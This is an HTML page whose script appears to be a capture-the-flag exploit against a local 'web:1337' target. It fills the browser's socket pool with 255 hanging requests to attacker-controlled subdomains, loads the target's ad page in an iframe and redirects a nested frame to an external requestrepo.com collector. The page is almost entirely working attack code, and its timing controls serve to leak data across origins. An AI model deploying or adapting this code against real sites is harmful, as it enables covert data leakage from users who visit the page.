<textarea id="log" style="width: 100%; height: 300px;"></textarea>
<script>
    SOCKETLIMIT = 255;
    MYSERVER = `xxxxxx.xxxxxxxxxxxxxxx.xxx` // eg. sleep.attacker.com
    TARGET = "http://web:1337"

    let errors = 0;
    let done = 0;

    const logtextarea = document.getElementById("log");

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    const loadFont = (fontName, fontUrl) => {
        const font = new FontFace(fontName, `url(${fontUrl})`);

        font.load().then((loadedFont) => {
            document.fonts.add(loadedFont);
        })
    };

    const log = (l, type = 'INFO') => {
        logtextarea.value += `${l}\n`;
        logtextarea.scrollTop = logtextarea.scrollHeight;
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;

        fetch(`https://sleep${i}.${MYSERVER}/360?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        }).catch(() => {
            errors++;
        });

        done++;

        return controller
    }

    const clear_log = () => {
        logtextarea.value = '';
    }

    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }

    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
    }

    
    let block;
    async function main(){
        let start = performance.now();

        await sleep(100);
        await exhaust_sockets();

        fetch("/exhausted");

        const iframe = document.createElement("iframe");
        iframe.src = "http://web:1337/ad.html";
        document.body.appendChild(iframe);

        await sleep(5);

        block = fetch_sleep_long(1337);

        await sleep(1000);

        iframe.contentWindow.frames[0].location = "https://s8lhs4o1.requestrepo.com/";


        await sleep(1000);

        quick();

        await sleep(2000);

        free();



    }

    function quick(){
        block.abort();
        block = fetch_sleep_long(1337);
    }

    function free(){
        block.abort();
    }

    function occupy(){
        block.abort();
    }

    main();
</script>

<button onclick="quick()" >quick</button>
<button onclick="occupy()" >Occupy</button>
<button onclick="free()" >free</button>
